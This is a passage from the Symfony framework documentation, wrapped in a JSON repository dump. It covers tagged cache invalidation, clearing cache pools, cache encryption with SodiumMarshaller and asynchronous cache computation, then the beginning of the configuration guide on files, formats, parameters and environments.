__construct(\n            private TagAwareCacheInterface $myCachePool,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            $value0 = $this->myCachePool->get('item_0', function (ItemInterface $item): string {\n                $item->tag(['foo', 'bar']);\n\n                return 'debug';\n            });\n\n            $value1 = $this->myCachePool->get('item_1', function (ItemInterface $item): string {\n                $item->tag('foo');\n\n                return 'debug';\n            });\n\n            // Remove all cache keys tagged with \"bar\"\n            $this->myCachePool->invalidateTags(['bar']);\n        }\n    }\n\nThe cache adapter needs to implement :class:`Symfony\\\\Contracts\\\\Cache\\\\TagAwareCacheInterface`\nto enable this feature. This could be added by using the following configuration.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                pools:\n                    my_cache_pool:\n                        adapter: cache.adapter.redis_tag_aware\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache>\n                    <framework:pool name=\"my_cache_pool\"\n                        adapter=\"cache.adapter.redis\"\n                        tags=\"true\"\n                    />\n                </framework:cache>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                ->pool('my_cache_pool')\n                    ->tags(true)\n                    ->adapters(['cache.adapter.redis'])\n            ;\n        };\n\nTags are stored in the same pool by default. This is good in most scenarios. But\nsometimes it might be better to store the tags in a different pool. That could be\nachieved by specifying the adapter.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n        framework:\n            cache:\n                pools:\n                    my_cache_pool:\n                        adapter: cache.adapter.redis\n                        tags: tag_pool\n                    tag_pool:\n                        adapter: cache.adapter.apcu\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache>\n                    <framework:pool name=\"my_cache_pool\"\n                        adapter=\"cache.adapter.redis\"\n                        tags=\"tag_pool\"\n                    />\n                    <framework:pool name=\"tag_pool\" adapter=\"cache.adapter.apcu\"/>\n                </framework:cache>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                ->pool('my_cache_pool')\n                    ->tags('tag_pool')\n                    ->adapters(['cache.adapter.redis'])\n            ;\n\n            $framework->cache()\n                ->pool('tag_pool')\n                    ->adapters(['cache.adapter.apcu'])\n            ;\n        };\n\n.. note::\n\n    The interface :class:`Symfony\\\\Contracts\\\\Cache\\\\TagAwareCacheInterface` is\n    autowired to the ``cache.app`` service.\n\nClearing the Cache\n------------------\n\nTo clear the cache you can use the ``bin/console cache:pool:clear [pool]`` command.\nThat will remove all the entries from your storage and you will have to recalculate\nall the values. You can also group your pools into \"cache clearers\". There are 3 cache\nclearers by default:\n\n* ``cache.global_clearer``\n* ``cache.system_clearer``\n* ``cache.app_clearer``\n\nThe global clearer clears all the cache items in every pool. The system cache clearer\nis used in the ``bin/console cache:clear`` command. The app clearer is the default\nclearer.\n\nTo see all available cache pools:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:list\n\nClear one pool:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:clear my_cache_pool\n\nClear all custom pools:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:clear cache.app_clearer\n\nClear all cache pools:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:clear --all\n\nClear all cache pools except some:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:clear --all --exclude=my_cache_pool --exclude=another_cache_pool\n\nClear all caches everywhere:\n\n.. code-block:: terminal\n\n    $ php bin/console cache:pool:clear cache.global_clearer\n\nClear cache by tag(s):\n\n.. code-block:: terminal\n\n    # invalidate tag1 from all taggable pools\n    $ php bin/console cache:pool:invalidate-tags tag1\n\n    # invalidate tag1 & tag2 from all taggable pools\n    $ php bin/console cache:pool:invalidate-tags tag1 tag2\n\n    # invalidate tag1 & tag2 from cache.app pool\n    $ php bin/console cache:pool:invalidate-tags tag1 tag2 --pool=cache.app\n\n    # invalidate tag1 & tag2 from cache1 & cache2 pools\n    $ php bin/console cache:pool:invalidate-tags tag1 tag2 -p cache1 -p cache2\n\nEncrypting the Cache\n--------------------\n\nTo encrypt the cache using ``libsodium``, you can use the\n:class:`Symfony\\\\Component\\\\Cache\\\\Marshaller\\\\SodiumMarshaller`.\n\nFirst, you need to generate a secure key and add it to your :doc:`secret\nstore </configuration/secrets>` as ``CACHE_DECRYPTION_KEY``:\n\n.. code-block:: terminal\n\n    $ php -r 'echo base64_encode(sodium_crypto_box_keypair());'\n\nThen, register the ``SodiumMarshaller`` service using this key:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/cache.yaml\n\n        # ...\n        services:\n            Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller:\n                decorates: cache.default_marshaller\n                arguments:\n                    - ['%env(base64:CACHE_DECRYPTION_KEY)%']\n                    # use multiple keys in order to rotate them\n                    #- ['%env(base64:CACHE_DECRYPTION_KEY)%', '%env(base64:OLD_CACHE_DECRYPTION_KEY)%']\n                    - '@.inner'\n\n    .. code-block:: xml\n\n        <!-- config/packages/cache.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n\n            <services>\n                <service id=\"Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller\" decorates=\"cache.default_marshaller\">\n                    <argument type=\"collection\">\n                        <argument>env(base64:CACHE_DECRYPTION_KEY)</argument>\n                        <!-- use multiple keys in order to rotate them -->\n                        <!-- <argument>env(base64:OLD_CACHE_DECRYPTION_KEY)</argument> -->\n                    </argument>\n                    <argument type=\"service\" id=\".inner\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/cache.php\n        use Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller;\n        use Symfony\\Component\\DependencyInjection\\ChildDefinition;\n        use Symfony\\Component\\DependencyInjection\\Reference;\n\n        // ...\n        $container->setDefinition(SodiumMarshaller::class, new ChildDefinition('cache.default_marshaller'))\n            ->addArgument(['env(base64:CACHE_DECRYPTION_KEY)'])\n            // use multiple keys in order to rotate them\n            //->addArgument(['env(base64:CACHE_DECRYPTION_KEY)', 'env(base64:OLD_CACHE_DECRYPTION_KEY)'])\n            ->addArgument(new Reference('.inner'));\n\n.. danger::\n\n    This will encrypt the values of the cache items, but not the cache keys. Be\n    careful not to leak sensitive data in the keys.\n\nWhen configuring multiple keys, the first key will be used for reading and\nwriting, and the additional key(s) will only be used for reading. Once all\ncache items encrypted with the old key have expired, you can completely remove\n``OLD_CACHE_DECRYPTION_KEY``.\n\nComputing Cache Values Asynchronously\n-------------------------------------\n\nThe Cache component uses the `probabilistic early expiration`_ algorithm to\nprotect against the :ref:`cache stampede <cache_stampede-prevention>` problem.\nThis means that some cache items are elected for early-expiration while they are\nstill fresh.\n\nBy default, expired cache items are computed synchronously. However, you can\ncompute them asynchronously by delegating the value computation to a background\nworker using the :doc:`Messenger component </components/messenger>`. In this case,\nwhen an item is queried, its cached value is immediately returned and a\n:class:`Symfony\\\\Component\\\\Cache\\\\Messenger\\\\EarlyExpirationMessage` is\ndispatched through a Messenger bus.\n\nWhen this message is handled by a message consumer, the refreshed cache value is\ncomputed asynchronously. The next time the item is queried, the refreshed value\nwill be fresh and returned.\n\nFirst, create a service that will compute the item's value::\n\n    // src/Cache/CacheComputation.php\n    namespace App\\Cache;\n\n    use Symfony\\Contracts\\Cache\\ItemInterface;\n\n    class CacheComputation\n    {\n        public function compute(ItemInterface $item): string\n        {\n            $item->expiresAfter(5);\n\n            // this is just a random example; here you must do your own calculation\n            return sprintf('#%06X', mt_rand(0, 0xFFFFFF));\n        }\n    }\n\nThis cache value will be requested from a controller, another service, etc.\nIn the following example, the value is requested from a controller::\n\n    // src/Controller/CacheController.php\n    namespace App\\Controller;\n\n    use App\\Cache\\CacheComputation;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    use Symfony\\Contracts\\Cache\\CacheInterface;\n    use Symfony\\Contracts\\Cache\\ItemInterface;\n\n    class CacheController extends AbstractController\n    {\n        #[Route('/cache', name: 'cache')]\n        public function index(CacheInterface $asyncCache): Response\n        {\n            // pass to the cache the service method that refreshes the item\n            $cachedValue = $asyncCache->get('my_value', [CacheComputation::class, 'compute'])\n\n            // ...\n        }\n    }\n\nFinally, configure a new cache pool (e.g. called ``async.cache``) that will use\na message bus to compute values in a worker:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            cache:\n                pools:\n                    async.cache:\n                        early_expiration_message_bus: messenger.default_bus\n\n            messenger:\n                transports:\n                    async_bus: '%env(MESSENGER_TRANSPORT_DSN)%'\n                routing:\n                    'Symfony\\Component\\Cache\\Messenger\\EarlyExpirationMessage': async_bus\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n           xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n           xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\"\n        >\n            <framework:config>\n                <framework:cache>\n                    <framework:pool name=\"async.cache\" early-expiration-message-bus=\"messenger.default_bus\"/>\n                </framework:cache>\n\n                <framework:messenger>\n                    <framework:transport name=\"async_bus\">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>\n                    <framework:routing message-class=\"Symfony\\Component\\Cache\\Messenger\\EarlyExpirationMessage\">\n                        <framework:sender service=\"async_bus\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/framework/framework.php\n        use function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\env;\n        use Symfony\\Component\\Cache\\Messenger\\EarlyExpirationMessage;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->cache()\n                ->pool('async.cache')\n                    ->earlyExpirationMessageBus('messenger.default_bus');\n\n            $framework->messenger()\n                ->transport('async_bus')\n                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                ->routing(EarlyExpirationMessage::class)\n                    ->senders(['async_bus']);\n        };\n\nYou can now start the consumer:\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume async_bus\n\nThat's it! Now, whenever an item is queried from this cache pool, its cached\nvalue will be returned immediately. If it is elected for early-expiration, a\nmessage will be sent through to bus to schedule a background computation to refresh\nthe value.\n\n.. _`probabilistic early expiration`: https://en.wikipedia.org/wiki/Cache_stampede#Probabilistic_early_expiration\n"
        },
        {
          "name": "components",
          "type": "tree",
          "content": null
        },
        {
          "name": "configuration.rst",
          "type": "blob",
          "size": 50.203125,
          "content": "Configuring Symfony\n===================\n\nConfiguration Files\n-------------------\n\nSymfony applications are configured with the files stored in the ``config/``\ndirectory, which has this default structure:\n\n.. code-block:: text\n\n    your-project/\n    ├─ config/\n    │  ├─ packages/\n    │  ├─ bundles.php\n    │  ├─ routes.yaml\n    │  └─ services.yaml\n\n* The ``routes.yaml`` file defines the :doc:`routing configuration </routing>`;\n* The ``services.yaml`` file configures the services of the :doc:`service container </service_container>`;\n* The ``bundles.php`` file enables/disables packages in your application;\n* The ``config/packages/`` directory stores the configuration of every package\n  installed in your application.\n\nPackages (also called \"bundles\" in Symfony and \"plugins/modules\" in other\nprojects) add ready-to-use features to your projects.\n\nWhen using :ref:`Symfony Flex <symfony-flex>`, which is enabled by default in\nSymfony applications, packages update the ``bundles.php`` file and create new\nfiles in ``config/packages/`` automatically during their installation. For\nexample, this is the default file created by the \"API Platform\" bundle:\n\n.. code-block:: yaml\n\n    # config/packages/api_platform.yaml\n    api_platform:\n        mapping:\n            paths: ['%kernel.project_dir%/src/Entity']\n\nSplitting the configuration into lots of small files might appear intimidating for some\nSymfony newcomers. However, you'll get used to them quickly and you rarely need\nto change these files after package installation.\n\n.. tip::\n\n    To learn about all the available configuration options, check out the\n    :doc:`Symfony Configuration Reference </reference/index>` or run the\n    ``config:dump-reference`` command.\n\n.. _configuration-formats:\n\nConfiguration Formats\n~~~~~~~~~~~~~~~~~~~~~\n\nUnlike other frameworks, Symfony doesn't impose a specific format on you to\nconfigure your applications, but lets you choose between YAML, XML and PHP.\nThroughout the Symfony documentation, all configuration examples will be\nshown in these three formats.\n\nThere isn't any practical difference between formats. In fact, Symfony\ntransforms all of them into PHP and caches them before running the application,\nso there's not even any performance difference.\n\nYAML is used by default when installing packages because it's concise and very\nreadable. These are the main advantages and disadvantages of each format:\n\n* **YAML**: simple, clean and readable, but not all IDEs support autocompletion\n  and validation for it. :doc:`Learn the YAML syntax </reference/formats/yaml>`;\n* **XML**: autocompleted/validated by most IDEs and is parsed natively by PHP,\n  but sometimes it generates configuration considered too verbose. `Learn the XML syntax`_;\n* **PHP**: very powerful and it allows you to create dynamic configuration with\n  arrays or a :ref:`ConfigBuilder <config-config-builder>`.\n\n.. note::\n\n    By default Symfony loads the configuration files defined in YAML and PHP\n    formats. If you define configuration in XML format, update the\n    :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Kernel\\\\MicroKernelTrait::configureContainer`\n    and/or\n    :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Kernel\\\\MicroKernelTrait::configureRoutes`\n    methods in the ``src/Kernel.php`` file to add support for the ``.xml`` file\n    extension.\n\nImporting Configuration Files\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony loads configuration files using the :doc:`Config component\n</components/config>`, which provides advanced features such as importing other\nconfiguration files, even if they use a different format:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        imports:\n            - { resource: 'legacy_config.php' }\n\n            # glob expressions are also supported to load multiple files\n            - { resource: '/etc/myapp/*.yaml' }\n\n            # ignore_errors: not_found silently discards errors if the loaded file doesn't exist\n            - { resource: 'my_config_file.xml', ignore_errors: not_found }\n            # ignore_errors: true silently discards all errors (including invalid code and not found)\n            - { resource: 'my_other_config_file.xml', ignore_errors: true }\n\n        # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <imports>\n                <import resource=\"legacy_config.php\"/>\n                <!-- glob expressions are also supported to load multiple files -->\n                <import resource=\"/etc/myapp/*.yaml\"/>\n\n                <!-- ignore-errors=\"not_found\" silently discards errors if the loaded file doesn't exist -->\n                <import resource=\"my_config_file.yaml\" ignore-errors=\"not_found\"/>\n                <!-- ignore-errors=\"true\" silently discards all errors (including invalid code and not found) -->\n                <import resource=\"my_other_config_file.yaml\" ignore-errors=\"true\"/>\n            </imports>\n\n            <!-- ... -->\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->import('legacy_config.php');\n\n            // glob expressions are also supported to load multiple files\n            $container->import('/etc/myapp/*.yaml');\n\n            // the third optional argument of import() is 'ignore_errors'\n            // 'ignore_errors' set to 'not_found' silently discards errors if the loaded file doesn't exist\n            $container->import('my_config_file.yaml', null, 'not_found');\n            // 'ignore_errors' set to true silently discards all errors (including invalid code and not found)\n            $container->import('my_config_file.yaml', null, true);\n        };\n\n        // ...\n\n.. _config-parameter-intro:\n.. _config-parameters-yml:\n.. _configuration-parameters:\n\nConfiguration Parameters\n------------------------\n\nSometimes the same configuration value is used in several configuration files.\nInstead of repeating it, you can define it as a \"parameter\", which is like a\nreusable configuration value. By convention, parameters are defined under the\n``parameters`` key in the ``config/services.yaml`` file:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            # the parameter name is an arbitrary string (the 'app.' prefix is recommended\n            # to better differentiate your parameters from Symfony parameters).\n            app.admin_email: 'something@example.com'\n\n            # boolean parameters\n            app.enable_v2_protocol: true\n\n            # array/collection parameters\n            app.supported_locales: ['en', 'es', 'fr']\n\n            # binary content parameters (encode the contents with base64_encode())\n            app.some_parameter: !!binary VGhpcyBpcyBhIEJlbGwgY2hhciAH\n\n            # PHP constants as parameter values\n            app.some_constant: !php/const GLOBAL_CONSTANT\n            app.another_constant: !php/const App\\Entity\\BlogPost::MAX_ITEMS\n\n            # Enum case as parameter values\n            app.some_enum: !php/enum App\\Enum\\PostState::Published\n\n        # ...\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <parameters>\n                <!-- the parameter name is an arbitrary string (the 'app.' prefix is recommended\n                     to better differentiate your parameters from Symfony parameters). -->\n                <parameter key=\"app.admin_email\">something@example.com</parameter>\n\n                <!-- boolean parameters -->\n                <parameter key=\"app.enable_v2_protocol\">true</parameter>\n                <!-- if you prefer to store the boolean value as a string in the parameter -->\n                <parameter key=\"app.enable_v2_protocol\" type=\"string\">true</parameter>\n\n                <!-- array/collection parameters -->\n                <parameter key=\"app.supported_locales\" type=\"collection\">\n                    <parameter>en</parameter>\n                    <parameter>es</parameter>\n                    <parameter>fr</parameter>\n                </parameter>\n\n                <!-- binary content parameters (encode the contents with base64_encode()) -->\n                <parameter key=\"app.some_parameter\" type=\"binary\">VGhpcyBpcyBhIEJlbGwgY2hhciAH</parameter>\n\n                <!-- PHP constants as parameter values -->\n                <parameter key=\"app.some_constant\" type=\"constant\">GLOBAL_CONSTANT</parameter>\n                <parameter key=\"app.another_constant\" type=\"constant\">App\\Entity\\BlogPost::MAX_ITEMS</parameter>\n\n                <!-- Enum case as parameter values -->\n                <parameter key=\"app.some_enum\" type=\"constant\">App\\Enum\\PostState::Published</parameter>\n            </parameters>\n\n            <!-- ... -->\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Entity\\BlogPost;\n        use App\\Enum\\PostState;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->parameters()\n                // the parameter name is an arbitrary string (the 'app.' prefix is recommended\n                // to better differentiate your parameters from Symfony parameters).\n                ->set('app.admin_email', 'something@example.com')\n\n                // boolean parameters\n                ->set('app.enable_v2_protocol', true)\n\n                // array/collection parameters\n                ->set('app.supported_locales', ['en', 'es', 'fr'])\n\n                // binary content parameters (use the PHP escape sequences)\n                ->set('app.some_parameter', 'This is a Bell char: \\x07')\n\n                // PHP constants as parameter values\n                ->set('app.some_constant', GLOBAL_CONSTANT)\n                ->set('app.another_constant', BlogPost::MAX_ITEMS)\n\n                // Enum case as parameter values\n                ->set('app.some_enum', PostState::Published);\n        };\n\n        // ...\n\n.. warning::\n\n    By default and when using XML configuration, the values between ``<parameter>``\n    tags are not trimmed. This means that the value of the following parameter will be\n    ``'\\n    something@example.com\\n'``:\n\n    .. code-block:: xml\n\n        <parameter key=\"app.admin_email\">\n            something@example.com\n        </parameter>\n\n    If you want to trim the value of your parameter, use the ``trim`` attribute.\n    When using it, the value of the following parameter will be ``something@example.com``:\n\n    .. code-block:: xml\n\n        <parameter key=\"app.admin_email\" trim=\"true\">\n            something@example.com\n        </parameter>\n\nOnce defined, you can reference this parameter value from any other\nconfiguration file using a special syntax: wrap the parameter name in two ``%``\n(e.g. ``%app.admin_email%``):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/some_package.yaml\n        some_package:\n            # any string surrounded by two % is replaced by that parameter value\n            email_address: '%app.admin_email%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/some_package.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- any string surrounded by two % is replaced by that parameter value -->\n            <some-package:config email-address=\"%app.admin_email%\">\n                <!-- ... -->\n            </some-package:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/some_package.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n        use function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\param;\n\n        return static function (ContainerConfigurator $container): void {\n            $container->extension('some_package', [\n                // when using the param() function, you only have to pass the parameter name...\n                'email_address' => param('app.admin_email'),\n\n                // ... but if you prefer it, you can also pass the name as a string\n                // surrounded by two % (same as in YAML and XML formats) and Symfony will\n                // replace it by that parameter value\n                'email_address' => '%app.admin_email%',\n            ]);\n        };\n\n.. note::\n\n    If some parameter value includes the ``%`` character, you need to escape it\n    by adding another ``%``, so Symfony doesn't consider it a reference to a\n    parameter name:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/services.yaml\n            parameters:\n                # Parsed as 'https://symfony.com/?foo=%s&amp;bar=%d'\n                url_pattern: 'https://symfony.com/?foo=%%s&amp;bar=%%d'\n\n        .. code-block:: xml\n\n            <!-- config/services.xml -->\n            <parameters>\n                <parameter key=\"url_pattern\">http://symfony.com/?foo=%%s&amp;bar=%%d</parameter>\n            </parameters>\n\n        .. code-block:: php\n\n            // config/services.php\n            namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n            return static function (ContainerConfigurator $container): void {\n                $container->parameters()\n                    ->set('url_pattern', 'http://symfony.com/?foo=%%s&amp;bar=%%d');\n            };\n\n.. include:: /components/dependency_injection/_imports-parameters-note.rst.inc\n\nConfiguration parameters are very common in Symfony applications. Some packages\neven define their own parameters (e.g. when installing the translation package,\na new ``locale`` parameter is added to the ``config/services.yaml`` file).\n\n.. tip::\n\n    By convention, parameters whose names start with a dot ``.`` (for example,\n    ``.mailer.transport``), are available only during the container compilation.\n    They are useful when working with :doc:`Compiler Passes </service_container/compiler_passes>`\n    to declare some temporary parameters that won't be available later in the application.\n\n.. seealso::\n\n    Later in this article you can read how to\n    :ref:`get configuration parameters in controllers and services <configuration-accessing-parameters>`.\n\n.. _page-creation-environments:\n.. _page-creation-prod-cache-clear:\n.. _configuration-environments:\n\nConfiguration Environments\n--------------------------\n\nYou have only one application, but whether you realize it or not, you need it\nto behave differently at different times:\n\n* While **developing**, you want to log everything and expose nice debugging tools;\n* After deploying to **production**, you want that same application to be\n  optimized for speed and only log errors.\n\nThe files stored in ``config/packages/`` are used by Symfony to configure the\n:doc:`application services </service_container>`. In other words, you can change\nthe application behavior by changing which configuration files are loaded.\nThat's the idea of Symfony's **configuration environments**.\n\nA typical Symfony application begins with three environments:\n\n* ``dev`` for local development,\n* ``prod`` for production servers,\n* ``test`` for :doc:`automated tests </testing>`.\n\nWhen running the application, Symfony loads the configuration files in this\norder (the last files can override the values set in the previous ones):\n\n#. The files in ``config/packages/*.<extension>``;\n#. the files in ``config/packages/<environment-name>/*.<extension>``;\n#. ``config/services.<extension>``;\n#. ``config/services_<environment-name>.<extension>``.\n\nTake the ``framework`` package, installed by default, as an example:\n\n* First, ``config/packages/framework.yaml`` is loaded in all environments and\n  it configures the framework with some options;\n* In the **prod** environment, nothing extra will be set as there is no\n  ``config/packages/prod/framework.yaml`` file;\n* In the **dev** environment, there is no file either (\n  ``config/packages/dev/framework.yaml`` does not exist).\n* In the **test** environment, the ``config/packages/test/framework.yaml`` file\n  is loaded to override some of the settings previously configured in\n  ``config/packages/framework.yaml``.\n\nIn reality, each environment differs only somewhat from others. This means that\nall environments share a large base of common configuration, which is put in\nfiles directly in the ``config/packages/`` directory.\n\n.. tip::\n\n    You can also define options for different environments in a single\n    configuration file using the special ``when`` keyword:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/packages/webpack_encore.yaml\n            webpack_encore:\n                # ...\n                output_path: '%kernel.project_dir%/public/build'\n                strict_mode: true\n                cache: false\n\n            # cache is enabled only in the \"prod\" environment\n            when@prod:\n                webpack_encore:\n                    cache: true\n\n            # disable strict mode only in the \"test\" environment\n            when@test:\n                webpack_encore:\n                    strict_mode: false\n\n            # YAML syntax allows to reuse contents using \"anchors\" (&some_name) and \"aliases\" (*some_name).\n            # In this example, 'test' configuration uses the exact same configuration as in 'prod'\n            when@prod: &webpack_prod\n                webpack_encore:\n                    # ...\n            when@test: *webpack_prod\n\n        .. code-block:: xml\n\n            <!-- config/packages/webpack_encore.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\n                    http://symfony.com/schema/dic/symfony\n                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n                <webpack-encore:config\n                    output-path=\"%kernel.project_dir%/public/build\"\n                    strict-mode=\"true\"\n                    cache=\"false\"\n                />\n\n                <!-- cache is enabled only in the \"test\" environment -->\n                <when env=\"prod\">\n                    <webpack-encore:config cache=\"true\"/>\n                </when>\n\n                <!-- disable strict mode only in the \"test\" environment -->\n                <when env=\"test\">\n                    <webpack-encore:config strict-mode=\"false\"/>\n                </when>\n            </container>\n\n        .. code-block:: php\n\n            // config/packages/framework.php\n            use Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\ContainerConfigurator;\n            use Symfony\\Config\\WebpackEncoreConfig;\n\n            return static function (WebpackEncoreConfig $webpackEncore, ContainerConfigurator $container): void {\n                $webpackEncore\n                    ->outputPath('%kernel.project_dir%/public/build')\n                    ->strictMode(true)\n                    ->cache(false)\n                ;\n\n                // cache is enabled only in the \"prod\" environment\n                if ('prod' === $container->env()) {\n                    $webpackEncore->cache(true);\n                }\n\n                // disable strict mode only in the \"test\" environment\n                if ('test' === $container->env()) {\n                    $webpackEncore->strictMode(false);\n                }\n            };\n\n.. seealso::\n\n    See the ``configureContainer()`` method of\n    :doc:`the Kernel class </configuration/front_controllers_and_kernel>` to\n    learn everything about the loading order of configuration files.\n\n.. _selecting-the-active-environment:\n\nSelecting the Active Environment\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony applications come with a file called ``.env`` located at the project\nroot directory. This file is used to define the value of environment variables\nand it's explained in detail :ref:`later in this article <config-dot-env>`.\n\nOpen the ``.env`` file (or better, the ``.env.local`` file if you created one)\nand edit the value of the ``APP_ENV`` variable to change the environment in\nwhich the application runs. For example, to run the application in production:\n\n.. code-block:: bash\n\n    # .env (or .env.local)\n    APP_ENV=prod\n\nThis value is used both for the web and for the console commands. However, you\ncan override it for commands by setting the ``APP_ENV`` value before running them:\n\n.. code-block:: terminal\n\n    # Use the environment defined in the .env file\n    $ php bin/console command_name\n\n    # Ignore the .env file and run this command in production\n    $ APP_ENV=prod php bin/console command_name\n\nCreating a New Environment\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe default three environments provided by Symfony are enough for most projects,\nbut you can define your own environments too. For example, this is how you 